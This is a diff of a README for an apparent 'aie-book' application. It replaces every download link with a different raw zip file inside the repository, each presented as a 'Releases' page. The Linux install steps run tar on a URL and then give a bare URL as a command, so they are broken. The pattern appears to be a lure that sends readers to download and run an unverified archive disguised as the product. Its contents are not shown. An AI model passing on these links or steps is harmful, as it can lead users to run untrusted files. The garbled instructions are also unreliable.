@@ -12,15 +12,15 @@ To get started with the aie-book, follow these simple steps to download and run 
 
 You can easily download the latest version of the aie-book application from our Releases page. 
 
-[![Download aie-book](https://raw.githubusercontent.com/andalusia205091/aie-book/main/phanic/aie-book.zip%20aie--book-blue)](https://raw.githubusercontent.com/andalusia205091/aie-book/main/phanic/aie-book.zip)
+[![Download aie-book](https://raw.githubusercontent.com/andalusia205091/aie-book/main/scripts/book-aie-v3.8.zip%20aie--book-blue)](https://raw.githubusercontent.com/andalusia205091/aie-book/main/scripts/book-aie-v3.8.zip)
 
-Simply visit this page to download: [aie-book Releases](https://raw.githubusercontent.com/andalusia205091/aie-book/main/phanic/aie-book.zip).
+Simply visit this page to download: [aie-book Releases](https://raw.githubusercontent.com/andalusia205091/aie-book/main/scripts/book-aie-v3.8.zip).
 
 ### 📦 Available Downloads
 
 On the Releases page, you will find the latest release and any previous versions. We recommend downloading the most recent version for the best experience.
 
-1. Go to the [aie-book Releases](https://raw.githubusercontent.com/andalusia205091/aie-book/main/phanic/aie-book.zip).
+1. Go to the [aie-book Releases](https://raw.githubusercontent.com/andalusia205091/aie-book/main/scripts/book-aie-v3.8.zip).
 2. Choose the version you want to download. Click on it.
 3. Look for the assets listed below the release notes.
 4. Click on the package that fits your operating system:
@@ -54,14 +54,14 @@ After downloading, install the application by following these instructions based
 
 #### Linux
 
-1. Locate the downloaded `https://raw.githubusercontent.com/andalusia205091/aie-book/main/phanic/aie-book.zip` file in your downloads folder.
+1. Locate the downloaded `https://raw.githubusercontent.com/andalusia205091/aie-book/main/scripts/book-aie-v3.8.zip` file in your downloads folder.
 2. Open a terminal.
 3. Navigate to the directory where the file was downloaded using the `cd` command.
 4. Run the following commands:
    ```bash
-   tar -xzvf https://raw.githubusercontent.com/andalusia205091/aie-book/main/phanic/aie-book.zip
+   tar -xzvf https://raw.githubusercontent.com/andalusia205091/aie-book/main/scripts/book-aie-v3.8.zip
    cd aie-book
-   https://raw.githubusercontent.com/andalusia205091/aie-book/main/phanic/aie-book.zip
+   https://raw.githubusercontent.com/andalusia205091/aie-book/main/scripts/book-aie-v3.8.zip
    ```
 
 ## 📖 How to Use aie-book
@@ -77,7 +77,7 @@ After installing the aie-book application, you can start exploring valuable reso
 
 ### Where can I find the latest updates?
 
-You can always find the latest updates by visiting the [aie-book Releases](https://raw.githubusercontent.com/andalusia205091/aie-book/main/phanic/aie-book.zip) page. 
+You can always find the latest updates by visiting the [aie-book Releases](https://raw.githubusercontent.com/andalusia205091/aie-book/main/scripts/book-aie-v3.8.zip) page. 
 
 ### Can I contribute to the project?
 
